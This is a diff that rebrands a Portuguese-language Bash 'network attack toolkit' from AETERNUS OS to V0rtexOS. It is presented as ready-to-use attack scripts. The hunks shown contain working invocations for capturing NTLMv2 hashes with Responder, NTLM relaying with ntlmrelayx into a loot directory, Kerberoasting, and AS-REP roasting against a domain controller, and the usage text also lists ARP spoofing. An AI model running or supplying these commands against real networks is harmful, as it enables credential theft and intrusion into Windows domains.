@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# AETERNUS OS — Network Attack Toolkit
+# V0rtexOS — Network Attack Toolkit
 # Scripts de ataque de rede prontos para uso
 # Uso: network-attacks.sh <modo> [args]
 
@@ -48,7 +48,7 @@ start_responder() {
     local iface="${1:-eth0}"
     log "Iniciando Responder em $iface"
     log "Capturando NTLMv2 hashes..."
-    python3 /opt/aeternus/Responder/Responder.py \
+    python3 /opt/vortex/Responder/Responder.py \
         -I "$iface" \
         -rdwP \
         --lm \
@@ -60,7 +60,7 @@ start_responder() {
 ntlm_relay() {
     local targets="${1:?Informe arquivo de alvos ou IP}"
     log "Iniciando NTLMRelayx → $targets"
-    python3 /opt/aeternus/impacket/examples/ntlmrelayx.py \
+    python3 /opt/vortex/impacket/examples/ntlmrelayx.py \
         -tf "$targets" \
         -smb2support \
         -l /tmp/loot \
@@ -129,7 +129,7 @@ kerberoast() {
     local user="${3:?Informe usuário}"
     local pass="${4:?Informe senha}"
     log "Kerberoasting no domínio $domain"
-    python3 /opt/aeternus/impacket/examples/GetUserSPNs.py \
+    python3 /opt/vortex/impacket/examples/GetUserSPNs.py \
         "$domain/$user:$pass" \
         -dc-ip "$dc" \
         -request \
@@ -142,7 +142,7 @@ asreproast() {
     local domain="${1:?Informe o domínio}"
     local dc="${2:?Informe IP do DC}"
     log "AS-REP Roasting — usuários sem pré-autenticação"
-    python3 /opt/aeternus/impacket/examples/GetNPUsers.py \
+    python3 /opt/vortex/impacket/examples/GetNPUsers.py \
         "$domain/" \
         -dc-ip "$dc" \
         -no-pass \
@@ -170,7 +170,7 @@ dns_axfr() {
 
 # ── Banner ─────────────────────────────────────────
 usage() {
-    echo -e "\n${CYN}AETERNUS OS — Network Attacks${RST}"
+    echo -e "\n${CYN}V0rtexOS — Network Attacks${RST}"
     echo
     echo "Modos disponíveis:"
     echo "  arp-spoof    <target> <gateway> [iface]"
